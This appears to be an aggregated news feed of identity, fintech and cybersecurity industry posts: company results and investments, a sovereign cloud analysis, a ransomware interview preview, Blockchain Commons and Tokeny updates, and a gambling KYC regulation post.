<p>All of these developments concern Zwipe Pay ONE, the company’s biometric card solution, which enables fingerprint recognition on the card in order to authenticate transactions. In a letter to shareholders this past summer, Løvestam asserted that his firm had “passed most critical milestones and major risk points” in the solution’s development, opening the door to a phase of pilots and certifications before finally moving on to commercialization.</p>



<p>“All in all, I am happy to report that we continue to experience broad-based acknowledgement of Zwipe’s competitiveness and value add for the industry from all parts of the payment ecosystem,” Løvestam said in the company’s latest update.</p>



<p>As for financials, revenues for the quarter amounted to roughly 400,000 NOK, while monthly operational cash flow intensified from MNOK -4.4 a year ago to MNOK -5.3 in the most recent quarter, a change that the company attributed to “recruitments and higher activity”.</p>



<p>Notably, Zwipe received an investment of NOK 104 million from Erik Selin, a prominent Swedish investor, in a 4 million-share private placement. The company’s cash balance stood at NOK 183.7 million at the end of Q3, and having received full forgiveness for a PPP loan, the company is currently free of debt.</p>

<p>Friction is the new F-word, and you know what that means. Complete this short survey to tell us how sensitive you are to those mobile experiences that rub you the wrong way and gain access to expert reports on preventing fraud and enhancing customer experiences in mobile apps. Eight survey respondents will receive a $50 Amazon gift card for participating.</p>


   When you read the word friction, what do you think?  Rug burn.  Changing my car’s tires.  The number of steps it takes to open a mobile account.  [Censored].    When using a mobile app how onerous does an onboarding experience have to be before you abandon a transaction?  If account creation takes longer than five minutes, I’m gone.  After three or four minutes you’ve lost my business.  I’m busy, if you can’t onboard me in less than two minutes you’re too slow for me.  I have a high tolerance for friction – it doesn’t matter how long account creation takes if I’m determined to use your app.    Are you interested in learning more about how 27 leading mobile apps compare when it comes to friction, or how low-friction technologies can decrease fraud in mobile banking? (Select all that apply)  I’m curious about the leading apps, show me the Mobile App Friction report. [Download the Mobile App Friction Report]  Tell me how a challenger bank nearly eliminated fraud without increasing friction. [Download the Incognia Case Study]    What is your purchasing authority? (Select all that apply)  I am a decision maker.  I am an influencer.  I specify or recommend products for purchase.  None.    Is your organization evaluating biometrics and identity technologies?

 InfoCert’s international expansion go faster and the Company aims to become the European Digital Trust Champion. 

<p>On October 27th 2021, Tinexta S.p.A. announced the signing of a binding agreement for the entry of Bregal Milestone into the share capital of InfoCert, with a minority stake.</p>

<p>Bregal Milestone is a European private equity fund managing more than €1.1 billion invested in technology sector. Bregal Milestone is part of Bregal Investments, a global group that has invested more than €15 billion since 2002 and currently has more than €12 billion in assets under management.</p>

<p>This operation will allow InfoCert to accelerate its ambitious international growth and development plan, which started in 2018 with the acquisition of Camerfirma and continued, more recently, with the acquisition of CertEurope and the investment in Authada. The support of a global partner such as Bregal Milestone, which has a specific know-how in the technology sector and an extensive network in Europe, will foster seizing the opportunities arising from the consolidation process of the Digital Trust.</p>

<p>The transaction involves an investment by Bregal Milestone of 100 million euros for the subscription of a dedicated capital increase up to a total share of 16.09% of InfoCert’s equity.</p>

<p>Combined with the acquisition of CertEurope, the investment of Bregal Milestone allows InfoCert to consolidate its role as a leader in the Digital Trust sector in Europe and at the same time to be able to offer to all its customers, especially in Italy, the best of the solutions and experience gained in over 20 countries.</p>

  <p>by <a href="https://www.kuppingercole.com/team/small">Mike Small</a></p><p>Using cloud services has now become an essential component of digital transformation.&nbsp; However, the dominant cloud service providers are not European and, following the recent <a href="https://www.europarl.europa.eu/RegData/etudes/ATAG/2020/652073/EPRS_ATA(2020)652073_EN.pdf">Schrems II </a>judgment, transferring personal data to these services has become increasingly problematic. This is just one factor behind the increased interest in the idea of the sovereign cloud.</p>
 The Impact of Globalisation 
<p>Globalization has provided many benefits allowing nation-states and organizations to obtain what they need, when they need it from wherever it is cheapest. This has reduced the costs for citizens and businesses alike but has created an increased dependency on ever more extended supply chains.&nbsp; The COVID epidemic and subsequent supply chain disruptions have called this approach into question. The notion of the sovereign cloud needs to be seen in this context.</p>
<p>Cloud sovereignty involves several areas, these include but are not limited to the protection of personal data. It also includes the protection of intellectual property, commercial secrets, as well as other forms of sensitive information. It concerns the influence that service users have over the legal frameworks that bind the service through a say in government. Also, their confidence in service continuity not only in the event of natural disasters but also of geopolitical conflicts.&nbsp;</p>
 The Sovereign Cloud 
<p>The idea behind the sovereign cloud is to ensure that the services provided are within the control of the jurisdiction where it is used. This can be achieved in several ways through legal, and technical measures as well as physical location. Within Europe, there are already <a href="https://plus.kuppingercole.com/article/mc80900/european-hosted-hybrid-iaas-cloud/">several cloud services</a> that are locally owned and delivered.&nbsp; However, these services find it hard to compete against the level of functionality provided by the global hyper-scale cloud services and the economies of scale that they enjoy.&nbsp; Therefore, using purely local providers often involves increased costs and or reduced functionality.</p>
<p>Another approach is for state-sponsored projects.&nbsp; However, these have a chequered history when it comes to innovation and, in any case, the richness of the existing hyper-scale cloud services leaves an enormous gap to close.&nbsp; Therefore, quite sensibly, the European <a href="https://www.data-infrastructure.eu/GAIAX/Navigation/EN/Home/home.html">GAIAX project</a> does not seek to replace the existing cloud services but rather to increase local control.&nbsp; Google, together with other hyper-scale cloud providers, is a founding member of GAIAX.</p>
 Privacy of Personal Data 
<p>This Schrems II judgment has crystallized the risks around the privacy of personal data highlighting the differences in the rules between jurisdictions.&nbsp; The consequences of this judgment are still being played out and can be very disruptive.&nbsp; For example, the <a href="https://edpb.europa.eu/news/national-news/2021/census-2021-portuguese-dpa-cnpd-suspended-data-flows-usa_en">Portuguese Information Commissioner gave the Portuguese Census Office</a> twelve hours’ notice to cease and desist from using a US based cloud service.</p>
<p>The use of cloud services that are owned and operated by providers that are outside the jurisdiction where they are used creates a risk.&nbsp; This is that a provider in another jurisdiction may be legally obliged to obey instructions from their government and that this foreign government is not bound by commercial contracts made by providers with organizations outside of that jurisdiction.&nbsp; This risk is highlighted by the Schrems II judgment.</p>
<p>The European Data Protection Board recommendations identify three points at which the privacy of data can be compromised – during transfer, at rest in storage, and while being processed.&nbsp; The recommendations cover contractual tools such including standard data protection clauses (SCCs), binding corporate rules (BCRs), codes of conduct, certification mechanisms, and ad hoc contractual clauses.&nbsp; The EDPB also provided an updated <a href="https://edpb.europa.eu/our-work-tools/our-documents/edpbedps-joint-opinion/edpb-edps-joint-opinion-12021-standard_en">Joint Opinion 1/2021 on standard contractual clauses between controllers and processors</a>.&nbsp; In addition, the EDPB recommendations require supplementary technical measures and describe three approaches for which example use cases are provided.&nbsp; These technical steps include encryption, pseudonymization and multi-party computing.</p>
 Four Key areas of Sovereignty 
<p>There are four key areas of sovereignty which should be considered.&nbsp; These are data sovereignty, operational sovereignty, technical sovereignty, and sovereign ownership.&nbsp;</p>
<p>Data sovereignty – the customer should have control over the access to and the use of their data.&nbsp; This is what the technical measures from the EDPB are intended to enforce.&nbsp; Since many data processing regulations specify this, the customer should also have control over the physical location of their data and administrative access by cloud service administrators.&nbsp; With the exception of the location of administrators, data sovereignty is supported by all the major IaaS providers although not all customers make full use of the controls provided.</p>
<p>Operational sovereignty – this is control over the jurisdiction where the administration of the service and its infrastructure is conducted.&nbsp; The EDPB technical measures are intended to mitigate that lack of this control.&nbsp; The major CSPs now offer a form of “cloud in a box” which the customer can locate and administer wherever they wish.&nbsp; Other clouds are working to enable third party administration through partnerships with managed service providers in certain regions.&nbsp; The major hardware manufacturers also provide a partial solution offering hardware as a service where the customer rents capacity in dedicated servers that are located where the customer chooses.</p>
<p>Technical Sovereignty – the customer is able to develop, deploy, move, and manage their workloads with the minimum of disruption. While there is significant openness in application development environments, the major hyperscale clouds are built on proprietary technical stacks and this makes it hard to move a workload to another cloud.&nbsp; It also makes it hard to manage the hybrid multi-cloud and on-premises IT environment that is now common in most organizations.&nbsp; There is a need for standard interfaces that customers can use to build, deploy, manage, and optimize their workloads independently of the cloud service used.&nbsp; This is still work in progress with VMware, OpenStack, Anthos, RedHat OpenShift all offering some level of solution to some of the problems.</p>
<p>Sovereign Ownership – the infrastructure used to provide the cloud service is normally owned by the CSP.&nbsp; This means that even if it is located in a given geography its use could be withdrawn by the CSP in the event of geopolitical conflict.&nbsp; Even if it were to be seized by a government the knowledge and external infrastructure required would make it difficult to make it operational.</p>
 Opinion 
<p>Most of the discussion around the sovereign cloud has focussed on data sovereignty and, while this is important, there are other areas that need to be considered to provide a fully sovereign cloud.&nbsp; For most organizations, the major driver for sovereignty is the need for compliance. In this respect, all the major CSPs provide or support substantial technical and contractual controls. However, the technical controls available are not always fully exploited by cloud customers.&nbsp; Recently announced partnerships which enable allow a local service provider to deliver a version of a global service provide a solution to some of the operational sovereignty concerns.&nbsp; However, it remains to be seen whether these will actually work out in practice. &nbsp;Where full sovereignty is required, there are other factors that need to be considered. The trade-off between functionality, cost and all the four aspects of sovereignty is one that organizations need to consider when deciding on how to deploy their applications.</p>

  <p>by <a href="https://www.kuppingercole.com/team/suess">Fabian Süß</a></p><p>Andrzej Kawalec, Head of Cybersecurity at Vodafone Business, will give a presentation entitled <a href="https://www.kuppingercole.com/sessions/4921">Ransomware: What Happens When the Tech Stops?</a> on Thursday November 11 from 09:30 pm to 09:50 am at <a href="https://www.kuppingercole.com/events/csls2021" title="Cybersecurity Leadership Summit 2021">Cybersecurity Leadership Summit 2021</a>.</p>
<p>To give you a sneak preview of what to expect, we asked Andrzej some questions about his presentation.</p>
  
 Could you give us a sneak peek into your Keynote: “Ransomware: What Happens When the Tech Stops?” 
<p>I'm really excited to be able to share with you a discussion about genuinely how we have become critically dependent on technology and in our day to day lives and our professional lives, when and how cybercriminals are able to turn off our technology and disrupt our lives. I think it's a key issue for us all to think about. In the talk, we'll talk a little bit about how not just ransomware, but cybercrime has evolved to become genuinely one of the greatest challenges and threats I think society faces. We'll also talk a little bit about the risk that we face, who are our targets? Are we all targets? And then what we can do not if but when we experience digital disruption. I find it one of the most fascinating subjects to think about, and I really look forward to sharing that with you.</p>
 How was it possible that Ransomware evolved into Ransomware as a service (RaaS), a fully functional business with a highly developed criminal ecosystem? 
<p>What one of the most fascinating aspects of how ransomware is involved is actually how the criminal world has evolved. If we think about the poster children for digital disruption, Uber, Netflix and the like. For me, the most significant digital disruptive industry is the cybercrime industry. Cybercrime has overtaken the global illegal drugs trade, and it is an industry that is characterized by brutal innovation.</p>
<p>It's an ecosystem, globally connected, using cloud based and SaaS technologies to prosecute operations in any country against any person in the world, built upon anonymity and an anonymous and untraceable currency. I don't think it's a surprise at that point that we are facing a pandemic of ransomware using some of the most understood and groundbreaking technologies. So, ransomware as a service is just an example of how that global cybercrime industry has been able to out innovate the digital adoption and normal industry.</p>
 How can employees be both your weakest link and first line of defense? 
<p>One of the things that we often do in technology and in business is we think about the process and the systems and the technologies, but actually at the heart of all the value that's created are people. Digital value is only created when you when a person can access data and those two things come together. Cyber criminals understand that and target the individual, the user, the employee. What we often do as a security industry is think about ways to protect or help that user. What we actually need to do is think of them not as a weak link, but actually as a first line of defense.</p>
<p>And increasingly, if I think about in a mid and post-pandemic world where individuals and users are being, you know, are really being pushed to their homes to hybrid working models, they are at the frontline of security, not just for themselves, but their families and their employers and the people they collaborate and partner with. So, employees, people, individuals are absolutely our first line of defense and our best hope when it comes to thinking and dealing with these threats, not just dealing with them, but also recovering from them. Now security is both a boardroom issue now, but also a spare room issue as we all work from its bearings and in places all around the world. A key focus and a key area that we will talk about is how you focus on the individual, the user, the person who creates the value.</p>
 Should you pay ransom? 
<p>One of the biggest questions anybody can face. Should you pay ransom? The FBI say no. Europol say no. By paying ransom, you perpetuate the cybercriminal industry and you finance illegal activity. It's not that black and white. It really isn't that black and white. For me, the failure is that the vast majority of organizations that do pay a ransom, I think only 6% get all their data back. They don't reduce their disruption significantly.</p>
<p>But the difficult choice that an organization or an individual has to make, is exactly that, it's a very difficult choice, and I think people will choose to pay a ransom, even though it feels uncomfortable and morally or legally difficult because they don't feel they have another choice. Everything we should do is to give individuals and organizations the ability to make a choice about whether to pay ransom or not. But I completely agree with the FBI and Europol and most organizations that say, you shouldn't pay ransom, you will not get all your data back and you are funding an illegal enterprise and industry.</p>

			<p>In 2017, we started Tokeny with the vision to make capital markets more accessible by building the most advanced tokenization platform. In only 4 years, our enterprise-grade tokenization platform has enabled financial institutions, governments, and companies to tokenize a total of 8 billion euro of assets on public blockchains in a compliant manner. We have achieved many milestones <a href="https://tokeny.com/three-years-of-tokeny-solutions/">since last year</a>:</p>
 
 PoC with major French banks: Team up with French banks to explore a digital interbank currency system 
 Blockchain50: Named in the CB Insights Blockchain50 
 Billboard launched: Launched the first no-MTF license required secondary market solution 
 Blockchain layer enhancement: Integrated with the Polygon blockchain network for superfast transactions 
 Added digital euro pair: Bring the digital euro to the T-REX Platform 
 Gas Tank launched: No more blockchain fees for both issuers and investors 
 ERC-3643: The T-REX Protocol recognized as ERC-3643 by the Ethereum community 
 A lot more exciting news is coming up…<br>
 
 
<p>Clearly, we are on the right path and are getting closer to reaching our goals. We would like to take this opportunity to thank all of our customers, partners, and friends who have supported and trusted us — without your support, we wouldn’t be here. A big thank you also goes out to each member of the team, we are proud to have built a talented, passionate and agile team, and together, nothing seems impossible!</p>

		 
	 
     
	 
		 
			<p>To date, we have built a complete compliance infrastructure that covers the entire value chain of tokenization: primary market, secondary market and lifecycle management. We’ve made the public blockchain suitable for financial institutions with a unique onchain compliance approach relying on digital identities.</p>

		 
	 
     
	 
		 
			<p>The market is moving quickly, according to Bloomberg, <a href="https://www.bloomberg.com/news/articles/2021-06-18/venture-capital-makes-a-record-17-billion-bet-on-crypto-world?sref=3REHEaVI">70% of institutional investors expect to invest in digital assets</a> in the future. Now that investors and technology are ready, we expect financial institutions to bring assets to the blockchain in massive numbers in the coming year. We are proud and excited to provide the technology shield for players to accelerate the digital transformation of capital markets.</p>
<p>We see a bright future for security tokens and the blockchain ecosystem. And we invite you to join us to become a part of this journey to build the future of finance, one that opens investment opportunities to everyone in a more efficient way.</p>
<p>P.S. This year, we managed to have a hybrid style celebration to combine online and offline activities. As you can see below, we had lots of fun. And we look forward to seeing what the future holds. Cheers!</p>

  <p>Greetings Oktaverse! I’m Tanay 🖖</p>

<p>I have been following Okta for many years, and I am very excited to finally join you all and get a chance to serve this wonderful community.</p>

<p>First things first, here’s a picture of me so that you can recognize me and say hi the next time we meet. 👇</p>

<p></p>

 Who I am and what I’ve done so far 

<p>I started my journey into the world of tech communities and open source back in college when I came across <a href="https://www.mozilla.org/">Mozilla</a>. I got the chance to participate in a lot of their projects and regional community-building initiatives. Over time, I fell in love with writing and have published books on Firefox OS, virtual assistants with Raspberry Pi, and WebVR.</p>

<p>During my last years in college, I got the chance to join the Tech Speakers program by Mozilla, and I dove head-first into the realm of public speaking. After wrapping up my studies, I moved to Berlin and worked with start-ups like <a href="https://www.researchgate.net/">ResearchGate</a>, <a href="https://crate.io/">Crate.io</a>, and <a href="https://n8n.io/">n8n</a>.</p>

<p> Image from <a href="https://blog.mozilla.org/community/2020/09/03/five-years-of-tech-speakers/">Mozilla’s blog</a></p>

<p>Before joining Okta, I have been responsible for building a developer relations team from scratch and managing the various facets of developer relations like docs, user on-boarding, support, partnerships, certifications, and community building.</p>

<p>I love geeking out about space exploration, submarines, science, and Lego models. Next on my reading list are:</p>
 
   Letters from an Astrophysicist by Neil deGrasse Tyson 
   Why We Sleep by Matthew Walker 
   The Culture Code: The Secrets of Highly Successful Groups by Daniel Coyle 
 

<p>Do you have any book recommendations for me? 🤓</p>

 What I’ll be doing at Okta 

<p>I am fortunate to have worked with some of the most vibrant developer communities and individuals across the globe. I hope to use all the skills and knowledge I have acquired to help you get started and succeed with Okta.</p>

<p>As a result of my experiences, my operating style in developer relations is motivated by the urge to:</p>
 
   Share fascinating things that I have recently learned 
   Serve my communities by empathetically understanding their pain points 
   Enable my communities to be their best selves and become successful 
 

<p>You’ll be hearing a lot more from me on topics around security and identity. I am also very excited to work on educational resources for you all in my favorite languages: JavaScript and Python.</p>

<p>Is there anything you’d like me to create or focus on first? 🧑‍🚀</p>

 How to get in touch 

<p>You can find me on <a href="https://twitter.com/tanay1337">Twitter</a>, <a href="https://www.linkedin.com/in/tanay1337/">LinkedIn</a>, and <a href="https://github.com/tanay1337/">GitHub</a>. You can also write to me via my email <code>tanay.pant@okta.com</code>.</p>

 Reference Libraries 

<p>Some of our most important work at Blockchain Commons is on specifications that improve the interoperability and resilience of cryptocurrency wallets. Our reference libraries allow developers to incorporate those specifications into their own code.</p>

<p>SSKR Security Review. However, there’s one more thing required before our libraries can be used in production releases: security reviews. Our vision is that third-party developers using our libraries will work with us to contract a security review from a third-party. They can take advantage of all the libraries already reviewed, and then they can increase that selection with a review of their own. Our sustaining sponsor, <a href="https://bitmark.com/">Bitmark</a>, began that process this quarter by arranging a security review for our <a href="https://github.com/BlockchainCommons/bc-shamir">bc-shamir</a> and <a href="https://github.com/BlockchainCommons/bc-sskr">bc-sskr</a> libraries through <a href="https://radicallyopensecurity.com/">Radically Open Security (ROS)</a>.</p>

<p>The folks at ROS tested our software and noted potential security problems. We then worked with them to close all issues that we felt were a priority. Because Blockchain Commons is dedicated to transparency, we have published the <a href="https://github.com/BlockchainCommons/bc-sskr/blob/master/reviews/2021-security-review.pdf">review</a> and our <a href="https://github.com/BlockchainCommons/bc-sskr/blob/master/SECURITY-REVIEW.md">response</a>, which includes a listing of issues that we resolved, as well as those we did not (and why). Thanks to this review, we feel that the <code>bc-shamir</code> and <code>bc-sskr</code> libraries are the first of our reference libraries ready for production deployment.</p>

<p>Project Nayuki Port. We also released a minor new utility library, a port of the Project Nayuki QR library into Swift as <a href="https://github.com/blockchaincommons/QRCodeGenerator">QRCodeGenerator</a>. We’d discovered that Apple’s native iOS QR generation is inefficient for QR codes where individual segments require different optimization. Nayuki does the right thing, by individually optimizing each segment, so we ported it over as a replacement for the native Apple libraries, for use in our own code and by other developers.</p>

 Reference Apps 

<p>Our reference apps provide exemplar use of our specifications (and libraries).</p>

<p>SeedTool Updates. The release of Seedtool was one of our big events in Q2. In Q3 we’ve continued that work through two notable upgrades, releasing <a href="https://github.com/BlockchainCommons/GordianSeedTool-iOS/blob/master/README.md#version-history">1.1 in July, 1.2 in August, and 1.2.1 in September</a>. Some of the biggest updates included arbitrary key derivation, preset SSKR schemes, and developer functions that make it easier to test out QR &amp; UR-based requests and responses. We also added our first Ethereum support, through the ability to derive Ethereum private keys and addresses from your stored seeds. Our updated <a href="https://github.com/BlockchainCommons/GordianSeedTool-iOS/blob/master/Docs/MANUAL.md">SeedTool Manual</a> describes all of the latest functionality.</p>

<p>QRTool Updates. Seedtool wasn’t the only reference app to get attention; <a href="https://github.com/BlockchainCommons/GordianQRTool-iOS">QRTool</a> also received some minor updates in July, though those largely took the form of minor bug fixes. Updating QR Tool to use the Project Nayuki library port will be our next big update for QR Tool, sometime in the future.</p>

 Bitcoin Utilities 

<p>Other utilities make it easier to use Bitcoin and other blockchain and crypto-technology.</p>

<p>Bitcoin Standup Updates. <a href="https://github.com/BlockchainCommons/Bitcoin-Standup-Scripts">Bitcoin Standup</a> was one of Blockchain Commons’ first releases. It automates the installation of a secure Bitcoin Core setup on a Debian Linux device or virtual machine . However, Bitcoin Core is always changing, requiring occasional updates. Our newest version of Bitcoin Standup, 0.8.0, updates the scripts to work well with Bitcoin Core 22.0 (which made some changes to its code signing).</p>

<p>However, Bitcoin Standup 0.8.0 does more than that. We’ve always imagined Standup as an engine that can install a wide variety of cryptocurrency and blockchain applications, and the new version of Standup offers the opportunity for the first such addition: <a href="https://cypherpunkpay.org/">cypherpunkpay</a>, an easy and accessible server for receiving Bitcoin payments. This addition, though just a starting point, was one of the <a href="https://hrf.org/">Human Rights Foundation (HRF)</a> projects initiated by our 2021 interns, to offer cyryptocurrency support for activists.</p>

<p>Gordian Server Officially Released. Our <a href="https://github.com/BlockchainCommons/GordianServer-macOS">Gordian Server</a> project took Bitcoin Standup as a jumping-off point and offered the same ability to easily install Bitcoin Core on the more accessible macOS UI. Like Bitcoin Standup it’s intended as the heart of a self-sovereign setup, where you can control both your wallet and your server. We released Gordian Server in some preliminary versions in 2020, but we’ve now polished it to improve its stability and ease of use, and have released it as the Feature-Complete <a href="https://github.com/BlockchainCommons/GordianServer-macOS/releases/tag/v1.0.0">1.0.0</a>. Like our newest Standup release, this version of Gordian Server has also been updated to work correctly with Bitcoin Core 22.0.</p>

 Learning Resources 

<p>One of Blockchain Commons’ goals has always been to improve the developmental understanding of Bitcoin. We also extend that goal to our own releases by working to make our specifications as accessible as possible.</p>

<p>Learning Bitcoin Translations. Our popular <a href="https://github.com/BlockchainCommons/Learning-Bitcoin-from-the-Command-Line">Learning Bitcoin from the Command Line course</a> has brought numerous developers into the industry. We’re thus thrilled to offer complete translations in <a href="https://github.com/BlockchainCommons/Learning-Bitcoin-from-the-Command-Line/tree/portuguese-translation/pt">Portuguese</a> and <a href="https://github.com/BlockchainCommons/Learning-Bitcoin-from-the-Command-Line/tree/spanish-translation/es">Spanish</a>. This enormous amount of work was the product of a number of volunteers, some of whom were also working with us as interns, which means that the <a href="https://hrf.org/">HRF</a> should again be thanked for their support. We hope that these translations will help bring Bitcoin development to the Spanish- and Portuguese-speaking world, which seems particularly important given El Salvador’s recent move to Bitcoin as a currency. (Learning Bitcoin also enjoyed quite a few minor edits as a result of the translations, as well as updates to include i2p and some recent revisions, resulting in our release of <a href="https://github.com/BlockchainCommons/Learning-Bitcoin-from-the-Command-Line/releases/tag/v2.1.0">version 2.1</a>; we’ve also got plans for <a href="https://github.com/BlockchainCommons/Learning-Bitcoin-from-the-Command-Line/blob/master/TODO-30.md">3.0</a>.)</p>

<p>New SSKR Docs. Shamir’s Secret Sharing is a critical element of #SmartCustody in today’s digital-assets world, which is why our SSKR library received our first security review. We’ve also been expanding our docs to talk more about how and why to use secret sharing (and why not to). Our newest <a href="https://github.com/BlockchainCommons/crypto-commons/blob/master/Docs/sskr-overview.md">SSKR docs</a> include <a href="https://github.com/BlockchainCommons/SmartCustody/blob/master/Docs/SSKR-Sharing.md">Designing SSKR Share Scenarios</a>, which discusses many models for sharing (including all of the default scenarios now found in SeedTool), and <a href="https://github.com/BlockchainCommons/SmartCustody/blob/master/Docs/SSKR-Dangers.md">SSKR Dangers</a>, which talks about why we ultimately prefer multisigs to secret-sharing.</p>

 Building to Specifications &amp; Laws 

<p>Specifications and supportive references are the first steps in bringing new ideas to the industry. To reach their fullest potential, those ideas eventually have to become something more …</p>

<p>DID Standardization. The DID specification, which is currently a <a href="https://www.w3.org/TR/did-core/">1.0 candidate recommendation</a> for an international standard, is our next big technical step forward for self-sovereign identity. Unfortunately, big centralized companies such as Apple and Google have taken notice and unsurprisingly raised complaints. We’ve offered some support with language and with championing the hard work already done, though the heavy lifting continues to be done by the editors, including Drummond Reed, Manu Sporny, Amy Guy, and Markus Sabadello.</p>

<p>Principal Authority. Many specifications and standards need legal support to reach their fullest potential. Our work in Wyoming has resulted in the state legislature arriving at a legal definition of digital identity that centers on the concept of principal authority. This quarter, we released <a href="https://www.blockchaincommons.com/articles/Principal-Authority/">a paper</a> on how principal authority defines self-sovereign identity, and what the next steps are. (We also presented the paper and testified about it to the Wyoming legislature.)</p>

<p>eResidency &amp; Other Testimony. Overall, we’ve been thrilled to be working with Wyoming, creating some of the first and best laws for supporting blockchains, cryptocurrency, digital identity, and digital companies. In a <a href="https://wyoleg.gov/InterimCommittee/2021/S19-2021092109-01E-Residency.pdf">recent presentation</a>, we urged them to leverage the infrastructure they’ve created into an eResidency program that can extend these benefits to companies worldwide. In other testimony for Wyoming, North Dakota, Texas, and the Netherlands we have provided support new laws for DAOs, updates to GDPR regulations and have advised how to avoid vendor lock-in and future-proof technology.</p>

 Other Future Expansions 

<p>Finally, we’re also looking to the future in other ways.</p>

<p>Ethereum Expansion. As noted, we’ve expanded Gordian SeedTool to support Ethereum key derivations. We’ve also been experimenting with selling some self-sovereign-identity NFTs to raise funds for Blockchain Commons. Generally, this all demonstrates our goal of bringing many of our philosophies, architectures, and models to the Ethereum blockchain. In particular, we believe that #SmartCustody, and especially SSKR, could help Ethereum, which has a lot of its own challenges for responsible key management, such as the lack of true multisig. If you’d like to support our expansion into Ethereum, please <a href="https://github.com/sponsors/BlockchainCommons">become a sponsor</a> and let us know why you did (or watch for upcoming NFT auctions!).</p>

<p>Second Intern Program. Finally, we’ve just completed our second summer’s intern program, and we’re thrilled to have another batch of interns who we helped to introduce to the world of blockchain development and who in turn helped us push forward projects such as our Learning Bitcoin translations and revisions. They also: produced a <a href="https://github.com/BlockchainCommons/Secure-Development-Setup-macOS">secure development setup guide</a> and a <a href="https://github.com/BlockchainCommons/Pseudonymity-Guide">pseudonymity guide</a> that offered more support for activists and HRF; developed a <a href="https://github.com/BlockchainCommons/mori-cli">mori-cli program</a> for leaving behind your digital assets; worked on creating a stable version of Esplora; and more. Some of our 2021 interns have already gone on to other paid work in the field; we’re looking forward to seeing what they create next!</p>

<p>Thank you, as always, for your interest in Blockchain Commons and the improvement of the entire blockchain field. If you like what we’re doing, we again encourage you to become a <a href="https://github.com/sponsors/BlockchainCommons">Github sponsor</a> so that we can continue forward with our work of making the industry independent, private, interoperable, and resilient!</p>

  <p>by <a href="https://www.kuppingercole.com/team/bailey">Anne Bailey</a></p>Digital identity is a core element of business, more essential than ever before as the workforce becomes increasingly more mobile. The key to enable more efficient work is to remove barriers to onboarding and access for employees within the organization, and those partners, suppliers, and contractors outside the organization while adding additional security to the onboarding and lifecycle management of identities. A way to do this is to leverage a network of trusted identities. This whitepaper discusses the approach to operationalizing validated identity data for enterprise workforce use.

<div class='wrap'>

<p>As we know, regulations are specific rules that are created and maintained by authorities. They apply to nearly every aspect of life, but within the gambling sector, they play a key role. Due to the nature of the industry where lives can be impacted through bad decisions and abuse, certain rules and limitations need to be made to ensure a safe playing field for users and operators alike.</p>
<p>However, one key issue that affects everyone in this sector is the speed at which technology advances, making it impossible for regulations to keep up with these developments. One of the most recent examples of this is the growing popularity of online gambling, which faces issues with cybercrime and fraud. In some cases, there are even gaps between old regulation and modern technologies – something that we at IDnow are collaborating with regulators to solve.</p>
 A look at Germany’s new Gambling regime 
<p>A great example to look at concerning regulations is Germany. The country has recently opened up online gambling with the introduction of a new treaty – <a href="https://www.idnow.io/glossary/glucksspielstaatsvertrag-glustv/">Glücksspielneuregulierungstaatsvertrag (GlüNeuRStV)</a>, alongside a new authority, Saxony Anhalt.</p>
<p>One key thing that surrounds these new regulations is the focus on player safety, as well as AML and KYC compliance requirements. It’s vital for operators to know who their users are, ensure proper verification is put in place, prevent at-risk users from participating, and combat fraud where possible.</p>
<p>In fact, in order to get and maintain a license, operators will need to demonstrate a robust age verification solution, alongside other KYC checks and meeting certain AML requirements.</p>
 Meeting KYC and AML requirements around Europe 
<p>To meet these strict requirements, both in Germany and across Europe, operators will need to invest in setting up proper, robust systems. The key focus of these systems are player protection and operator security – it’s vital to both keep players safe and secure, while also combatting things like fraud.</p>
<p>It’s impossible to list every requirement for compliance all around Europe, as every country and its regulators will have differences in opinions and what’s needed. However, one way for any operator to meet requirements on a wide scale is through remote eKYC solutions, which are flexible in meeting a wide range of requirements.</p>
<p>The best way of doing this is by working with a partner that specializes in KYC and AML compliance and is able to bring a wide range of tools to the table. Some of the most important requirements that must be met include controlling player activity through exclusions, meeting security and risk-management standards, preventing fraud, and meeting customer needs by mitigating risks and providing seamless onboarding.</p>
 Are Operator and Regulator Aims Meeting Consumer Requirements? 
<p>With so many different requirements needing to be met by operators to be compliant with regulator rules there comes a key question: What about the consumer? When it all comes down to it, for both the operator and the regulator the consumers are the most important party.</p>
<p>That’s why it’s vital to discuss how current operator and regulator aims impact the consumer and if they’re meeting ever-changing requirements. The most important thing to consider is that there are many different types of consumers – there are young, old, experienced, and new players that all need to be considered.</p>
<p>With a step forward into online gaming, you need to not only consider ease of access for players who may not be accustomed to online content, but also keep in mind the younger tech-savvy audience. For example, regulators and operators alike need to consider a whole new avenue of online-based fraud and ensure players are protected from it as best as possible.</p>
<p>Customers will also have specific requirements which may not be a key priority for both operators and regulators. Considering current trends globally, there is a key focus on things being quick and easy. Consumers (especially younger customers) require a seamless experience, many users want to be able to play a game or place a quick bet while on the train or bus, as well as being able to register in an instant.</p>
<p>There is also a key focus on security, especially surrounding data. It’s a vital point for the consumer to know that their data is being safely stored and meeting things like GDPR requirements.</p>
<p>The biggest problem in all this is that while operators and regulators would like to meet all of their consumers’ needs and more, it’s incredibly difficult to keep up with the pace of technology. Operators struggle to keep up with requirements as staying compliant has to be a key focus, while it’s impossible for regulators to know what will come next.</p>
<p>There is a definite overlap in some consumer requirements and current operator and regulator aims, such as a growing focus on security, however, it’s also easy to see consumer requirements, like lightning-fast onboarding, being pushed aside.</p>
 Automated ID Verification’s role in gaming 
<p>One key way to aid both operators and regulators in meeting consumer requirements is through automated ID Verification. This is a way to provide a seamless onboarding process for new players by providing fast, AI-Powered identity verification, such as our very own AutoIdent.</p>
<p>Our <a href="https://www.idnow.io/products/idnow-autoident/">AutoIdent</a> covers both current operator and regulator aims, as well as customer requirements. It has a key focus on speed, usability, and security, while being a fully compliant verification tool. With AutoIdent, users can be verified within minutes, with a very simple process, solving both usability and speed requirements for consumers, while remaining compliant, reducing stress on operators and regulators, while meeting their aims for online services.</p>
<p>Overall, automated verification looks to be the way forward and is already becoming commonplace for operators and regulators alike. The UK’s gambling commission already recommends looking into AI-Powered services for onboarding processes and many operators have moved to such a system.</p>
<p>This benefits every party involved in the process, from making consumers’ lives easier, to reducing waiting times and increasing conversion rates, while keeping a high level of security.</p>

<p>Up to 2 billion people around the world don’t have reliable access to essential medicines and health products: leaving a vacuum too often filled by substandard or falsified products. The W.H.O. estimates that for low and middle income countries (LMICs)<a href="https://www.who.int/news-room/fact-sheets/detail/substandard-and-falsified-medical-products"> one in 10 medical products</a> is substandard. This costs billions upon billions of dollars per year, eye-watering sums that pale in comparison to the human cost: annually, 200,000 lives are lost in Africa to fake antimalarial drugs alone. </p>
